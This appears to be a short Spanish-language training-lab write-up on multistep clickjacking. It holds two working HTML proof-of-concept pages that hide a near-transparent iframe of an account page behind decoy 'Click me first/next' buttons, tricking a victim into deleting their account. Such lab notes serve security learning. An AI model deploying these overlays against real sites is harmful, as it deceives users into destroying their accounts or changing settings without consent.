# Clickjacking en múltiples pasos  

Tags: #Clickjacking 

```bash 
En este lab se presenta una defensa adicional contra el clickjacking: además de un token CSRF, el botón de eliminación de cuenta incluye una ventana de confirmación. Para explotar esta funcionalidad, el ataque debe engañar a la víctima para que realice dos clics consecutivos en ubicaciones específicas: uno para activar el botón de “Eliminar cuenta” y otro para confirmar la acción.


Notas:
	1. Este lab solo funciona con Edge 
	2. Se deben de hacer dos acciones (Borrar y confirmar la cuenta)
```

```html 
# PoC para el probar el primer clic

<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.001;       
}

div{
position: absolute;
top: 497px;
left: 90px;
}
</style>

<div>Click me first</div>
<iframe src="https://web.com/my-account?email=hacked@hacked.com"></iframe>
```

```html 
# PoC para el ejercicio completo con los dos clics

<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.001;       
}

.fistClick{
position: absolute;
top: 497px;
left: 70px;
}

.secondClick{
position: absolute;
top: 295px;
left: 200px;
}
</style>

<div class="fistClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://web.com/my-account"></iframe>
```